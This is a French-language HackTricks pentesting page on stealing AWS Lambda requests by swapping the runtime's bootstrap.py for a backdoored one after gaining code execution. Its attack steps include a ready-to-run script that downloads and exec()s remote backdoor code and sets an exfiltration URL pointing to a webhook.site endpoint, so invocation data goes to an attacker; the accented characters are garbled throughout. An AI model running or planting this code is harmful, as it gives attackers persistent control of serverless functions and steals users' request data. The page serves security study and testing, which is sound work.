# AWS - Voler les requ√™tes Lambda

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Flux Lambda

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer** est un processus en dehors du conteneur qui **envoie** des **invocations** au processus **init**.
2. Le processus init √©coute sur le port **9001** en exposant certains points d'extr√©mit√© int√©ressants :
* **`/2018-06-01/runtime/invocation/next`** ‚Äì obtenir l'√©v√©nement d'invocation suivant
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** ‚Äì renvoyer la r√©ponse du gestionnaire pour l'invocation
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** ‚Äì renvoyer une erreur d'ex√©cution
3. **bootstrap.py** a une boucle qui r√©cup√®re les invocations du processus init et appelle le code des utilisateurs pour les g√©rer (**`/next`**).
4. Enfin, **bootstrap.py** envoie la **r√©ponse** √† init.

Notez que bootstrap charge le code utilisateur en tant que module, donc toute ex√©cution de code effectu√©e par le code utilisateur se produit en r√©alit√© dans ce processus.

## Voler les requ√™tes Lambda

L'objectif de cette attaque est de faire ex√©cuter au code utilisateur un processus malveillant **`bootstrap.py`** √† l'int√©rieur du processus **`bootstrap.py`** qui g√®re la requ√™te vuln√©rable. Ainsi, le processus **bootstrap malveillant** commencera √† **communiquer avec le processus init** pour g√©rer les requ√™tes tandis que le **bootstrap l√©gitime** est **pi√©g√©** en ex√©cutant le malveillant, donc il ne demandera pas de requ√™tes au processus init.&#x20;

Il est facile d'accomplir cette t√¢che car le code de l'utilisateur est ex√©cut√© par le processus **`bootstrap.py`** l√©gitime. Ainsi, l'attaquant pourrait :

* **Envoyer un faux r√©sultat de l'invocation actuelle au processus init**, de sorte que init pense que le processus bootstrap attend plus d'invocations.
* Une requ√™te doit √™tre envoy√©e √† **`/${invoke-id}/response`**&#x20;
* L'invoke-id peut √™tre obtenu √† partir de la pile du processus **`bootstrap.py`** l√©gitime en utilisant le module python [**inspect**](https://docs.python.org/3/library/inspect.html) (comme [propos√© ici](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)) ou simplement en le demandant √† nouveau √† **`/2018-06-01/runtime/invocation/next`** (comme [propos√© ici](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)).
* Ex√©cuter un **`bootstrap.py`** malveillant qui g√©rera les prochaines invocations
* Pour des raisons de discr√©tion, il est possible d'envoyer les param√®tres d'invocation Lambda √† un C2 contr√¥l√© par les attaquants, puis de g√©rer les requ√™tes comme d'habitude.
* Pour cette attaque, il suffit d'obtenir le code original de **`bootstrap.py`** √† partir du syst√®me ou de [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py), ajouter le code malveillant et l'ex√©cuter √† partir de l'invocation Lambda actuelle.

### √âtapes de l'attaque

1. Trouver une vuln√©rabilit√© **RCE**.
2. G√©n√©rer un **bootstrap** **malveillant** (par exemple [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. **Ex√©cuter** le bootstrap malveillant.

Vous pouvez facilement effectuer ces actions en ex√©cutant :
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
Pour plus d'informations, consultez [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)

## R√©f√©rences

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
